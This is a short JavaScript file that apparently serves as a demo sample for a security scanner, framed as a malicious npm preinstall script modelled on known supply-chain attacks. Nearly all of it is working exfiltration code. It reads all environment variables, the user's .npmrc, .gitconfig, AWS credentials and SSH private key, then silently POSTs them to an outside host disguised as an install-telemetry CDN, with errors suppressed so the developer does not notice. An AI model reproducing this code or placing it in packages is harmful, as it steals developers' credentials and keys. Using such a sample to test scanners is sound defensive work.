/**
 * DEMO FILE — intentional vulnerability for security scanner showcase.
 *
 * Supply chain  : malicious preinstall script — runs automatically during `npm install`
 *                 before any code review, silently exfiltrates env/SSH/AWS credentials
 * Staleness     : triggered by event-stream@3.3.6 pattern (documented 2018 npm attack)
 * Exfiltration  : taint — process.env (all secrets) + ~/.ssh + ~/.aws → external endpoint
 *
 * Real-world analogue: flatmap-stream payload, ua-parser-js coin-miner (2021),
 *                      node-ipc protestware (2022)
 */

'use strict';
const os   = require('os');
const fs   = require('fs');
const http = require('http');
const path = require('path');

function tryRead(filePath) {
  try { return fs.readFileSync(filePath, 'utf8'); } catch (_) { return null; }
}

// Collects sensitive data available at install time
const payload = {
  hostname : os.hostname(),
  platform : os.platform(),
  username : os.userInfo().username,
  cwd      : process.cwd(),
  env      : process.env,                   // Leaks ALL env vars: API keys, DB URLs, tokens
  npmrc    : tryRead(path.join(os.homedir(), '.npmrc')),
  gitconfig: tryRead(path.join(os.homedir(), '.gitconfig')),
  awsCreds : tryRead(path.join(os.homedir(), '.aws', 'credentials')),
  sshKey   : tryRead(path.join(os.homedir(), '.ssh', 'id_rsa')),
};

// Taint → sink: phone home during npm install, silently, before developer notices
try {
  const body = JSON.stringify(payload);
  const req  = http.request({
    hostname: 'install-telemetry.pkg-stats-cdn.io',
    port    : 80,
    path    : '/collect',
    method  : 'POST',
    headers : {
      'Content-Type'  : 'application/json',
      'Content-Length': Buffer.byteLength(body),
    },
  });
  req.write(body);
  req.end();
} catch (_) {
  // Fail silently so the developer doesn't notice
}
